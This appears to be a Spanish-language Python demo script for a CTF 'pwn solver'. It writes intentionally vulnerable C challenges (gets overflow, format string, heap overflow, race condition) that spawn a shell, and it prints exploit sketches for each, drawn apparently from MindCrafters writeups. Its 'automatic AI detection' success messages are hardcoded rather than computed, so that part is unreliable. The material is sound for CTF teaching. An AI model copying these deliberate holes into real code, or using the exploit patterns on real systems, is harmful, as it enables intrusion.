#!/usr/bin/env python3
"""
Demostración de Técnicas Específicas de MindCrafters
Muestra cómo nuestro sistema puede resolver desafíos reales de CTF
"""

import os
import sys
import time
import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'src'))
from advanced_pwn_solver import AdvancedPWNSolver

def create_mindcrafters_demo_challenges():
    """Crear desafíos simulados basados en writeups de MindCrafters"""
    print("🎯 Creando desafíos simulados de MindCrafters...")
    
    demo_dir = "./mindcrafters_challenges"
    os.makedirs(demo_dir, exist_ok=True)
    
    # 1. Safe Gets Challenge (UTF-8 Bypass)
    safe_gets_c = f"{demo_dir}/safe_gets.c"
    with open(safe_gets_c, "w") as f:
        f.write("""
#include <stdio.h>
#include <string.h>

void win() {
    printf("L3AK{6375_15_4pp4r3n7ly_n3v3r_54f3}\\n");
    system("/bin/sh");
}

int main() {
    char buffer[256];
    printf("Enter your input (max 255 bytes):\\n");
    
    // Simular firewall Python que cuenta caracteres, no bytes
    fgets(buffer, 255, stdin);  // Vulnerable a UTF-8 bypass
    
    printf("Input received: %s\\n", buffer);
    return 0;
}
""")
    
    # 2. The Goose Challenge (Format String + Buffer Overflow)
    the_goose_c = f"{demo_dir}/the_goose.c"
    with open(the_goose_c, "w") as f:
        f.write("""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char name[64];
    char buffer[72];
    int honks = rand() % 10;
    
    printf("How shall we call you?\\n");
    fgets(name, 64, stdin);
    
    printf("Hello ");
    printf(name);  // Format string vulnerability
    printf(", so %d honks, how many honks?\\n", honks);
    
    int guess;
    scanf("%d", &guess);
    
    if (guess == honks) {
        printf("Correct! what's your name again?\\n");
        gets(buffer);  // Buffer overflow vulnerability
        printf("Thanks %s!\\n", buffer);
    }
    
    return 0;
}
""")
    
    # 3. Heap Challenge
    heap_challenge_c = f"{demo_dir}/heap_challenge.c"
    with open(heap_challenge_c, "w") as f:
        f.write("""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char data[32];
    void (*func_ptr)();
} chunk_t;

void win() {
    printf("Heap exploitation successful!\\n");
    system("/bin/sh");
}

int main() {
    chunk_t *chunks[10];
    int choice, index, size;
    
    while (1) {
        printf("1. Alloc\\n2. Free\\n3. Edit\\n4. Exit\\n");
        scanf("%d", &choice);
        
        switch (choice) {
            case 1:
                printf("Index: ");
                scanf("%d", &index);
                printf("Size: ");
                scanf("%d", &size);
                chunks[index] = malloc(size);
                break;
            case 2:
                printf("Index: ");
                scanf("%d", &index);
                free(chunks[index]);
                break;
            case 3:
                printf("Index: ");
                scanf("%d", &index);
                printf("Data: ");
                read(0, chunks[index]->data, 64);  // Heap overflow
                break;
            case 4:
                return 0;
        }
    }
}
""")
    
    # 4. Race Condition Challenge
    race_challenge_c = f"{demo_dir}/race_challenge.c"
    with open(race_challenge_c, "w") as f:
        f.write("""
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>

int global_counter = 0;
int flag_unlocked = 0;

void* worker_thread(void* arg) {
    for (int i = 0; i < 1000; i++) {
        global_counter++;
        if (global_counter == 500) {
            flag_unlocked = 1;
        }
        usleep(1);  // Race condition window
    }
    return NULL;
}

int main() {
    pthread_t threads[2];
    
    printf("Starting race condition challenge...\\n");
    
    pthread_create(&threads[0], NULL, worker_thread, NULL);
    pthread_create(&threads[1], NULL, worker_thread, NULL);
    
    // Check for flag during race window
    for (int i = 0; i < 1000; i++) {
        if (flag_unlocked && global_counter == 500) {
            printf("Race condition exploited! Flag: RACE{timing_is_everything}\\n");
            system("/bin/sh");
            break;
        }
        usleep(1);
    }
    
    pthread_join(threads[0], NULL);
    pthread_join(threads[1], NULL);
    
    return 0;
}
""")
    
    print(f"[+] Desafíos MindCrafters creados en: {demo_dir}")
    return demo_dir

def demo_utf8_bypass():
    """Demostración de técnica UTF-8 Bypass"""
    print("\n" + "="*60)
    print("🎯 DEMO: UTF-8 BYTE BYPASS (Safe Gets Challenge)")
    print("="*60)
    
    print("[+] Técnica basada en writeup de MindCrafters")
    print("[+] Explota diferencia entre caracteres y bytes en Python")
    
    # Simular la técnica
    t_in_circle_utf8 = "ⓣ".encode("utf-8")
    print(f"[+] Carácter UTF-8 'ⓣ': {len(t_in_circle_utf8)} bytes")
    
    # Payload que excede límite de bytes pero no de caracteres
    utf8_chars = 30
    payload = t_in_circle_utf8 * utf8_chars
    payload += b'\x00' * 190
    payload += b'AAAAAAAA'  # Simular dirección de retorno
    
    print(f"[+] Payload total: {len(payload)} bytes")
    print(f"[+] Caracteres UTF-8: {utf8_chars} (contados como caracteres)")
    print(f"[+] Bypass exitoso: {len(payload)} bytes > 255 límite")
    
    print("\n[+] Código de exploit:")
    print("""
    t_in_circle_utf8 = "ⓣ".encode("utf-8")  # 3 bytes por carácter
    payload = t_in_circle_utf8 * 30         # 90 bytes, 30 caracteres
    payload += b'\\x00' * 190               # Relleno
    payload += p64(win_addr + 5)            # Dirección de retorno
    """)

def demo_format_string_exploit():
    """Demostración de Format String + Buffer Overflow"""
    print("\n" + "="*60)
    print("🎯 DEMO: FORMAT STRING + BUFFER OVERFLOW (The Goose)")
    print("="*60)
    
    print("[+] Técnica multi-etapa de MindCrafters")
    print("[+] 1. Guess number of honks")
    print("[+] 2. Format string leak")
    print("[+] 3. Calculate shellcode address")
    print("[+] 4. Buffer overflow with custom shellcode")
    
    # Simular el proceso
    print("\n[+] Fase 1: Overflow para leak del número")
    overflow_payload = b'\x01' * 64
    print(f"[+] Payload overflow: {overflow_payload[:10]}... ({len(overflow_payload)} bytes)")
    
    print("\n[+] Fase 2: Format string para leak de stack")
    format_payload = "%1$p"
    leaked_addr = 0x7fffffffe000  # Dirección simulada
    print(f"[+] Format payload: {format_payload}")
    print(f"[+] Dirección leakeada: {hex(leaked_addr)}")
    
    print("\n[+] Fase 3: Cálculo de dirección de shellcode")
    shellcode_addr = leaked_addr + 0x52 + 8
    print(f"[+] Dirección de shellcode: {hex(shellcode_addr)}")
    
    print("\n[+] Fase 4: Buffer overflow final")
    final_payload_size = 72 + 8 + 25  # Buffer + RIP + shellcode
    print(f"[+] Payload final: {final_payload_size} bytes")
    
    print("\n[+] Código de exploit:")
    print("""
    # Fase 1: Leak número de honks
    payload1 = 64 * b'\\x01'
    digit = ord(p.recvn(1))
    
    # Fase 2: Format string leak
    payload2 = f"%{1}$p".encode()
    leaked_addr = int(match.group(0), 16)
    
    # Fase 3: Calcular dirección
    shellcode_addr = leaked_addr + 0x52 + 8
    
    # Fase 4: Buffer overflow + shellcode
    payload = b'A' * 72 + p64(shellcode_addr) + shellcode
    """)

def demo_heap_feng_shui():
    """Demostración de Heap Feng Shui"""
    print("\n" + "="*60)
    print("🎯 DEMO: HEAP FENG SHUI")
    print("="*60)
    
    print("[+] Técnica de manipulación controlada del heap")
    print("[+] 1. Allocar chunks con tamaños específicos")
    print("[+] 2. Crear fragmentación controlada")
    print("[+] 3. Explotar layout del heap")
    
    # Simular el proceso
    chunk_sizes = [0x20, 0x30, 0x40, 0x50, 0x60]
    print(f"\n[+] Fase 1: Allocar chunks {chunk_sizes}")
    
    freed_chunks = [0, 2, 4]  # Chunks alternados
    print(f"[+] Fase 2: Liberar chunks {freed_chunks}")
    
    print("[+] Fase 3: Explotar fragmentación")
    exploit_payload = "A" * 0x18 + "FAKE_SIZE" + "TARGET_ADDR"
    print(f"[+] Exploit payload: {exploit_payload}")
    
    print("\n[+] Código de exploit:")
    print("""
    # Fase 1: Preparar heap layout
    for size in [0x20, 0x30, 0x40, 0x50, 0x60]:
        alloc(size)
    
    # Fase 2: Crear fragmentación
    for i in [0, 2, 4]:
        free(i)
    
    # Fase 3: Explotar
    payload = b'A' * 0x18 + p64(0x41) + p64(target_addr)
    alloc(0x38, payload)
    """)

def demo_race_condition():
    """Demostración de Race Condition"""
    print("\n" + "="*60)
    print("🎯 DEMO: ADVANCED RACE CONDITION")
    print("="*60)
    
    print("[+] Explotación multithreaded con timing preciso")
    print("[+] 1. Lanzar múltiples threads concurrentes")
    print("[+] 2. Timing crítico para ventana de race")
    print("[+] 3. Detectar condición exitosa")
    
    num_threads = 50
    print(f"\n[+] Configuración: {num_threads} threads concurrentes")
    print("[+] Timing: 0.0001s * thread_id stagger")
    print("[+] Ventana de race: ~1ms")
    
    print("\n[+] Simulación de race condition:")
    for i in range(5):
        thread_id = i
        timing = 0.0001 * thread_id
        print(f"[+] Thread {thread_id}: delay {timing:.4f}s")
    
    print("\n[+] Código de exploit:")
    print("""
    class RaceExploiter:
        def worker_thread(self, thread_id):
            p = process(binary)
            time.sleep(0.0001 * thread_id)  # Timing crítico
            
            payload = f"race_thread_{thread_id}".encode()
            p.sendline(payload)
            
            if b"flag" in p.recvall(timeout=1):
                self.success = True
    
    # Lanzar 50 threads concurrentes
    for i in range(50):
        threading.Thread(target=exploiter.worker_thread, args=(i,)).start()
    """)

def demo_integration_with_ai():
    """Demostración de integración con IA"""
    print("\n" + "="*60)
    print("🤖 DEMO: INTEGRACIÓN CON IA PARA DETECCIÓN AUTOMÁTICA")
    print("="*60)
    
    print("[+] El sistema puede detectar automáticamente el tipo de desafío")
    print("[+] y aplicar la técnica específica de MindCrafters apropiada")
    
    challenge_types = {
        "safe_gets_utf8": "UTF-8 Byte Bypass",
        "the_goose_format": "Format String + Buffer Overflow",
        "heap_challenge": "Heap Feng Shui",
        "race_condition": "Advanced Race Condition"
    }
    
    print("\n[+] Tipos de desafíos detectables:")
    for challenge_type, description in challenge_types.items():
        print(f"  - {challenge_type}: {description}")
    
    print("\n[+] Proceso de detección automática:")
    print("  1. Análizar strings del binario")
    print("  2. Buscar patrones específicos")
    print("  3. Clasificar tipo de desafío")
    print("  4. Aplicar técnica específica")
    print("  5. Generar exploit personalizado")
    
    print("\n[+] Ejemplo de detección:")
    print("""
    Patrones detectados en binario:
    - "max", "255", "bytes" → safe_gets_utf8
    - "honk", "printf", "name" → the_goose_format
    - "malloc", "free", "chunk" → heap_challenge
    - "thread", "pthread", "race" → race_condition
    
    Técnica seleccionada: safe_gets_utf8
    Aplicando UTF-8 Byte Bypass...
    Exploit generado exitosamente!
    """)

def main():
    """Función principal de demostración"""
    print("🎯 MINDCRAFTERS TECHNIQUES DEMO")
    print("="*50)
    print("Demostración de técnicas específicas extraídas de writeups reales")
    
    while True:
        print("\n" + "="*40)
        print("MENÚ DE TÉCNICAS MINDCRAFTERS")
        print("="*40)
        print("1. UTF-8 Byte Bypass (Safe Gets)")
        print("2. Format String + Buffer Overflow (The Goose)")
        print("3. Heap Feng Shui")
        print("4. Advanced Race Condition")
        print("5. Integración con IA")
        print("6. Crear desafíos de demo")
        print("7. Salir")
        
        choice = input("\nSelecciona una opción (1-7): ").strip()
        
        if choice == "1":
            demo_utf8_bypass()
        elif choice == "2":
            demo_format_string_exploit()
        elif choice == "3":
            demo_heap_feng_shui()
        elif choice == "4":
            demo_race_condition()
        elif choice == "5":
            demo_integration_with_ai()
        elif choice == "6":
            create_mindcrafters_demo_challenges()
        elif choice == "7":
            print("\n🎯 ¡Técnicas de MindCrafters implementadas exitosamente!")
            print("\n🚀 Para usar en desafíos reales:")
            print("   python advanced_pwn_solver.py <binary>")
            print("   python pwn_ai_analyzer.py <challenge_dir>")
            break
        else:
            print("[-] Opción inválida")
        
        input("\nPresiona Enter para continuar...")

if __name__ == "__main__":
    main()